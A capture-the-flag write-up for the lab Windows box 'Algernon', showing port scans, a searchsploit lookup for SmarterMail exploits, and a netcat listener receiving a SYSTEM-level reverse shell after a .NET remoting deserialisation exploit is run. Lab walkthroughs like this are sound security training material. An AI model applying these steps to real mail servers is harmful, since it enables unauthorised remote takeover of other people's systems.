---
layout: post
title: Proving Grounds - Algernon
date: 2020-10-07 12:16:22 +0100
description: Algernon is an easy Windows box featuring an outdated installation of a mail server. It features an array of open ports though one .NET remoting endpoint is vulnerable to a deserialisation attack.
img: os.jpeg
fig-caption: Algernon
categories: ProvingGrounds
tags: [Easy, Windows, Practice, CVE]
---
## Overview
Algernon is an easy Windows box featuring an outdated installation of a mail server. It features an array of open ports though one .NET remoting endpoint is vulnerable to a deserialisation attack.

## Enumeration
The initial scan reveals a fair number of open ports
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Algernon]
└─$ sudo nmap -p- -T4 192.168.200.65
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 17:54 BST
Nmap scan report for 192.168.200.65
Host is up (0.092s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
9998/tcp  open  distinct32
17001/tcp open  unknown
```
After some initial enumeration a SmarterMail mail server is found on port 9998. Searching exploitdb reveals a number of vulnerabilities. With the "Remote Code Execution" vulnerability being of particular interest.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Algernon]
└─$ searchsploit smartermail
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                        | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                    | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                               | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                       | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                      | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                    | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                                        | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                       | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                        | windows/dos/31607.py
---------------------------------------------------------------------------------------------- ---------------------------------
```
In the vulnerability we find that it relies on a .NET remote endpoint being available, thankfully this endpoint does seem to be exposed.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Algernon]
└─$ sudo nmap -p17001 -sV 192.168.200.65                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 19:20 BST
Nmap scan report for 192.168.200.65
Host is up (0.093s latency).

PORT      STATE SERVICE  VERSION
17001/tcp open  remoting MS .NET Remoting services
```
## Foothold
Having identified the vulnerability during enumeration, getting a shell is as simple as updating the LHOST nad LPORT in the script. Though we must make sure to use a port that is not blocked by the firewall, which in this case port 80 proved to work.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Algernon]
└─$ nc -nlvp 80                                                                                                                                         
listening on [any] 80 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.65] 49892

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32>
```
## Privilege Escalation

Privilege escalation is not required as we got a system shell directly from the foothold